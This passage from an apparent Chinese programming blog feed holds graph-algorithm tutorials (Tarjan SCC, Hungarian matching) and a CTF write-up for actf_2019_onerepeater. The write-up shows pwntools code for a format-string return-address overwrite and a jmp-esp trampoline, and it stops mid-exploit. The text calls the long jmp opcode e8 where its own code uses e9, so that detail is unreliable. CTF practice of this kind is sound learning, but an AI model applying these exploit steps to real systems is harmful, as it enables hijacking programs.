class="built_in">tarjan</span>(v);</span><br><span class="line">            low[u]=<span class="built_in">min</span>(low[u],low[v]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(visited[v])&#123;</span><br><span class="line">            low[u]=<span class="built_in">min</span>(low[u],low[v]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(dfn[u]==low[u])&#123;</span><br><span class="line">        visited[u]=<span class="number">0</span>;</span><br><span class="line">        num[u]=++tot;</span><br><span class="line">        <span class="keyword">while</span>(s[top]!=u)&#123;</span><br><span class="line">            visited[s[top]]=<span class="number">0</span>;</span><br><span class="line">            num[s[top--]]=tot;</span><br><span class="line">        &#125;</span><br><span class="line">        top--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.txt&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x, y, w;</span><br><span class="line">        <span class="keyword">float</span> p;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w&gt;&gt;p;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w,p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> start;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;start);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!dfn[i])<span class="built_in">tarjan</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=root[i];j;j=edge[j].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[j].to,w=edge[j].w;</span><br><span class="line">            <span class="keyword">float</span> p=edge[j].p;</span><br><span class="line">            <span class="keyword">if</span>(num[i]==num[v])&#123;<span class="comment">//同一个强连通分量内则把所有能产生的蘑菇加上</span></span><br><span class="line">                <span class="keyword">while</span>(w!=<span class="number">0</span>)&#123;</span><br><span class="line">                    amount[num[i]]+=w;</span><br><span class="line">                    w=(<span class="keyword">int</span>)((p)*w);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">add2</span>(num[i],num[v],w,p);<span class="comment">//否则建边</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=tot;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!degree[i])ss.<span class="built_in">push</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    ans[num[start]]=amount[num[start]];</span><br><span class="line">    flag[num[start]]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> res=ans[num[start]];<span class="comment">//res一定赋初值不要忘了</span></span><br><span class="line">    <span class="keyword">while</span>(!ss.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> x=ss.<span class="built_in">top</span>();</span><br><span class="line">        ss.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root2[x];i;i=e[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=e[i].to,w=e[i].w;</span><br><span class="line">            degree[v]--;</span><br><span class="line">            <span class="keyword">if</span>(!degree[v])ss.<span class="built_in">push</span>(v);</span><br><span class="line">            <span class="keyword">if</span>(flag[x])&#123;</span><br><span class="line">                ans[v]=<span class="built_in">max</span>(ans[v],ans[x]+w+amount[v]);<span class="comment">//状态转移方程</span></span><br><span class="line">                res=<span class="built_in">max</span>(res,ans[v]);<span class="comment">//保存结果</span></span><br><span class="line">                flag[v]=<span class="number">1</span>;<span class="comment">//flag向前传播</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(tot==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,ans[<span class="number">1</span>]);</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,res);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 强连通分量、缩点 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>二分图入门</title>
      <link href="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/"/>
      <url>/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>然后今天来学二分图，首先我们来看看二分图的定义。</p><span id="more"></span><h2 id="二分图的定义"><a href="#二分图的定义" class="headerlink" title="二分图的定义"></a>二分图的定义</h2><p>首先二分图它是一个图(G)，由点集(V)和边集(E)构成的集合，即<code>G=(V,E)</code>。</p><p>除此之外它还满足一个特点，若这个图的点集存在一个<strong>划分</strong><code>&#123;V1,V2&#125;</code>使得，任意的<code>e(i,j,w)∈E</code>满足关系，<code>i∈V1,j∈V2</code>或者是<code>i∈V2,j∈V1</code>。那么这个图就被称为一个二分图。</p><p>以上是比较数学的说法，而且是自己DIY的(狗头。那说人话就是说，如果你能找到一个合理的方式把点划成两个部分，使得每条边的两个顶点均不同时属于一个部分。那么它就是一个二分图。反之，如果不存在这样的划分满足以上结果，那么它就不是一个二分图。</p><p>二分图的一个等价定义是：不含有<strong>含奇数条边的环</strong>的图。</p><p>如果说了这么多让你感觉到还是有一点点难以理解的话，那么我们换一个思路：假设把人比作点，把相爱关系比作边。假设这个人群内没有舔狗(恋情非单向)和男酮，那么它们的关系组成的图就会是一个二分图。时间管理大师(一人同时与多人)不影响它还是一个二分图的，只要没有同就行。不知道这个例子是否够抽象，更易于理解。</p><p>举个例子，如下图，它是不是一个二分图？</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/1.png" alt="1"></p><p>判断二分图可以用它的性质，显而易见的性质是什么：边连接的两个点一定属于不同集合。用刚刚那个例子再去讲的话就是：没有同的情况下，喜欢男孩的一定都是女孩，而这里我们划分就是以男孩女孩作为依据划分的，接着往下推又可以得到：喜欢<strong>喜欢男孩的人</strong>的人一定也是男孩。这里我们从1开始，假设1为男，那么5，7必为女，2，8，3必为男，6，4必为女。</p><p>我们就可以得到划分：<code>&#123;&#123;1,2,3,8&#125;,&#123;4,5,6,7&#125;&#125;</code>。那么我们稍微画的明显一点，将两个划分独立为两排，得到了以下图。</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/2.png" alt="2"></p><p>为了方便，我们一般都会把二分图化成这种形式，可以很清楚的发现，同一排之间的点没有连线。那么你现在一定对二分图有了一个较为清楚的认识，那么可能会疑惑，这样的数据结构能用来处理什么样的问题呢？那么就涉及到我们接下来讲的概念了。</p><h2 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h2><ol><li>匹配(matching)：匹配其实就是一个边的集合，任意两条属于匹配的边都没有公共顶点，那么这个集合就叫做这个图的一个匹配。</li><li>匹配点：如果这个点存在于这个匹配的任意一条边上，那么这个点就是一个匹配点。</li><li>匹配边：如果这个边属于这个匹配，那么这就是一个匹配边。</li><li>非匹配点：与匹配点相对</li><li>非匹配边：与匹配边相对</li><li>最大匹配：在所有匹配中，所含边数量最多的称为最大匹配。</li><li>完美匹配：如果一个匹配中的所有边包含了一个图的所有点，即，一个图当中所有的点都为匹配点时，这个匹配称为完美匹配，并非所有的图都含有完美匹配，完美匹配一定是最大匹配。</li></ol><h3 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h3><p>比如还是上面这个图，假设它们就是四男四女，我们要怎样做，才能尽可能保证它们都和自己喜欢的人凑成一对呢？这实际上就是要求二分图的最大匹配了，最大匹配我们一般是用匈牙利算法，对于匈牙利算法，我们需要再补充一点概念。</p><ol><li>交替路：如果从一个非匹配点出发，依次经过匹配边，非匹配边，匹配边，非匹配边……形成的路径就叫交替路。</li><li>增广路：如果交替路的终点为一个非匹配点，那么这条交替路我们又叫增广路。</li></ol><p>如下图</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/3.png" alt="3"></p><p>红色点和红色边为匹配点和匹配边，这是一条增广路。</p><p>增广路的性质就是非匹配边会比匹配边多一条。如果我们把匹配边和非匹配边交换顺序，那么将会得到</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/4.png" alt="4"></p><p>可以到相比之前多了一个匹配边和两个匹配点。但是匹配顺序完全不一样了，原来是2，3匹配，4，5匹配，现在2，3和4，5都不在同一条匹配边上。</p><p>匈牙利算法的本质就是不停寻找增广路，增加匹配数目的。我们先不考虑匈牙利算法的代码，先徒手做一遍。首先我们需要匹配的点只有一边，另一边是被匹配的。</p><p>如最开始那个图，</p><p>从1开始，遍历边，先看1，5，发现5未被匹配，则直接匹配，结束。</p><p>那么现在的图是这样的。</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/5.png" alt="5"></p><p>从2开始，2未被匹配，则寻找与它相连的边，找到(2,5)，但是发现5已经被匹配了，这个时候就要用到寻找增广路的思维了。那么我们直接沿着匹配边搜寻，就找到了1，然后从1开始找相连的边，因为不能反复横跳，所以我们只能选择7，发现7没被匹配，因此2-5-1-7构成增广路，找到增广路之后代表首位两个点参与进了匹配。然后交换匹配边与非匹配边。成了这样</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/6.png" alt="6"></p><p>这里我们不考虑最好的情况，因为我们自己很清楚3，6匹配，4，8匹配直接就完结撒花了。但是计算机不一定按照这样的方式去遍历，你要保证先后顺序不影响最终结果，即就算你选择5，最终算出来的最大匹配应当也是4。</p><p>这里我们选5，发现5被匹配了，于是找到2，但是2之后再也找不到路径了，因此(3,5)方向上的增广路寻找失败，所以就会找(3,6)，(3,6)直接匹配，我们看看最后这个8会怎么样呢，我们假设也是先找到了7，7会找到1，1会找到5，5找到2，发现2找不到增广路了，返回失败。所以最终选择了(8,4)。那么这样一整个就是匈牙利算法了。</p><p>这里用C代码大概写一下，假设存图采用链式前向星。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[MAX_EDGE];</span><br><span class="line"><span class="keyword">int</span> match[MAX_NODE],check[MAX_NODE],root[MAX_NODE];</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;s;<span class="comment">//存储一边的点集</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    edge[++cnt].to=y;</span><br><span class="line">    edge[cnt].next=root[x];</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(!check[v])&#123;</span><br><span class="line">            check[v]=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(match[v]==<span class="number">-1</span>||<span class="built_in">dfs</span>(match[v]))&#123;</span><br><span class="line">                match[u]=v;</span><br><span class="line">                match[v]=u;</span><br><span class="line">                check[v]=<span class="literal">false</span>; </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xyl</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(match[s[i]]==<span class="number">-1</span>)&#123;</span><br><span class="line">            check[s[i]]=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">dfs</span>(s[i]))ans++;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><a href="https://www.luogu.com.cn/problem/P1129">洛谷P1129</a></p><p>小 Q 是一个非常聪明的孩子，除了国际象棋，他还很喜欢玩一个电脑益智游戏――矩阵游戏。矩阵游戏在一个 n \times n<em>n</em>×<em>n</em> 黑白方阵进行（如同国际象棋一般，只是颜色是随意的）。每次可以对该矩阵进行两种操作：</p><ul><li>行交换操作：选择矩阵的任意两行，交换这两行（即交换对应格子的颜色）。</li><li>列交换操作：选择矩阵的任意两列，交换这两列（即交换对应格子的颜色）。</li></ul><p>游戏的目标，即通过若干次操作，使得方阵的主对角线(左上角到右下角的连线)上的格子均为黑色。</p><p>对于某些关卡，小 Q 百思不得其解，以致他开始怀疑这些关卡是不是根本就是无解的！于是小 Q 决定写一个程序来判断这些关卡是否有解。</p><p>题意简单明了就是给一个01矩阵，问你能不能通过行交换与列交换将主对角线的元素都变成1。</p><p>那么其实就是每一行找到一个1，使得每个1处于不同的列。只要找到，那么经过若干次交换一定能使主对角线元素都为1。如果第一行的第三列存在一个1，那么就让1和3相连。当然因为这里的3不能和第三行混淆，所以我们选择列数+n作为二分图的另一个点集。所以我们只需要让行列都匹配那就完成了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[<span class="number">100000</span>];</span><br><span class="line"><span class="keyword">int</span> cnt,n,root[<span class="number">501</span>],check[<span class="number">500</span>],match[<span class="number">500</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="comment">//printf(&quot;%d %d\n&quot;,x,y);</span></span><br><span class="line">    edge[++cnt].to=y;</span><br><span class="line">    edge[cnt].next=root[x];</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(!check[v])&#123;</span><br><span class="line">            check[v]=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(match[v]==<span class="number">-1</span>||<span class="built_in">dfs</span>(match[v]))&#123;</span><br><span class="line">                match[u]=v;</span><br><span class="line">                match[v]=u;</span><br><span class="line">                check[v]=<span class="literal">false</span>; </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xyl</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(match[i]==<span class="number">-1</span>)&#123;</span><br><span class="line">            check[i]=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">dfs</span>(i))ans++;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="built_in">memset</span>(root,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(root));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">2</span>*n;i++)match[i]=<span class="number">-1</span>;</span><br><span class="line">    cnt=<span class="number">0</span>;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            <span class="keyword">int</span> x;</span><br><span class="line">            cin&gt;&gt;x;</span><br><span class="line">            <span class="keyword">if</span>(x==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">add</span>(i,j+n);</span><br><span class="line">                <span class="built_in">add</span>(j+n,i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">xyl</span>()==n)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Yes\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里被卡了有点久，最后发现是数组越界，在使用前向星存无向图的时候一定要记得开两倍内存，不然写越界了很难说错误在哪。</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/7.png" alt="7"></p><p>血淋淋的教训，并且失败的俩测试点没有报错re，而是wrong answer。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 二分图 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>actf_2019_onerepeater writeup</title>
      <link href="/2022/02/02/actf_2019_onerepeater%20writeup/"/>
      <url>/2022/02/02/actf_2019_onerepeater%20writeup/</url>
      
        <content type="html"><![CDATA[<p>buu刷题记录，<a href="https://buuoj.cn/challenges#actf_2019_onerepeater">actf_2019_onerepeater</a></p><span id="more"></span><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>拿到elf文件<code>checksec</code>一波，无任何保护，栈可执行，那么多半是要把程序流劫持到栈上执行<code>shellcode</code>了，拖进ida里面。</p><p><img src="/2022/02/02/actf_2019_onerepeater%20writeup/1.png" alt="1"></p><p>逻辑比较简单，菜单题，然后选项2是明显的格式化字符串漏洞，1选项就是读入<code>0x400</code>字节的数据。首先找到<code>jmp esp</code>的<code>gadget</code>。</p><p><img src="/2022/02/02/actf_2019_onerepeater%20writeup/2.png" alt="2"></p><p>有就很好办了，利用格式化字符串改掉返回地址为这个gadget，然后再在后面写一个跳板指令跳到缓冲区内，只要在退出之前把缓冲区写上shellcode就可以很快<code>get shell</code>了。</p><p>先通过测试偏移，发现buf在格式化字符串函数的第16个参数。</p><p><img src="/2022/02/02/actf_2019_onerepeater%20writeup/3.png" alt="3"></p><p>那么我们先把返回地址劫持了再说，经过调试发现返回地址在buf+0x41c的位置上。</p><p>写出部分exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">jmp_esp=<span class="number">0x08048907</span><span class="comment"># : jmp esp</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    byte=jmp_esp&amp;<span class="number">0xff</span></span><br><span class="line">    jmp_esp&gt;&gt;=<span class="number">8</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(byte).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x41c</span>+i)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"><span class="comment">#print(hex(len(payload)))</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="部分汇编知识"><a href="#部分汇编知识" class="headerlink" title="部分汇编知识"></a>部分汇编知识</h2><p>这里需要讲一讲汇编的知识了，因为我们在<code>jmp esp</code>的时候<code>esp</code>是指向我们返回地址的后面一格，所以<code>eip</code>等会会指向<code>ret_addr+4</code>的位置上，那么这个位置我们写些什么呢，当然直接写<code>shellcode</code>是肯定没问题的，实际操作也不会太难，一个循环解决，但是当复杂起来的时候这个就有点难，所以再需要一个跳板指令执行<code>jmp buf</code>，这里我们讲讲<code>jmp</code>的实现，<code>jmp</code>的编码是<code>5</code>个字节，其实有分大跳小跳，小跳只要两个字节，但是只能跳前后<code>0x7f</code>以内的位置。这里要跳到<code>buf</code>显然要用大跳了，大跳的编码是<code>e8</code> 后面跟上小端的<code>int</code>字节序。这个<code>int</code>字节呢代表偏移。</p><p>平时我们看到的<code>jmp 0x400689</code>这些实际编码都不是这样子编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e8 89 06 40 00</span><br></pre></td></tr></table></figure><p>而是会根据这个指令所处的位置，然后计算下一条指令到我要跳转的指令位置的数值作为jmp的参数。</p><p>举个例子，假如这个jmp 0x400689所处的位置是0x400500。那么它的编码将是</p><p>0x400689-(0x400500+5)=0x134</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e8 34 01 00 00</span><br></pre></td></tr></table></figure><p>这样子得到的。</p><p>如果是往低地址跳那就用负数表示。</p><p>这里呢我们要往<code>buf</code>跳，也就是低地址跳转，那么我们指令的位置是<code>buf+0x420</code>，所以得到偏移<code>0x425</code>，因为指令长度占了五个，跳转的起始位置是执行完这个指令的下一个位置。</p><p>取负数得到<code>0xfffffbdb</code>。</p><p>我们就得到了跳板指令的编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e8 db fb ff ff</span><br></pre></td></tr></table></figure><p>同样在下方部署这些字节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">b&#x27;\xe9\xdb\xfb\xff\xff&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    w=shellcode[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(w))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(w).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x420</span>+i)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    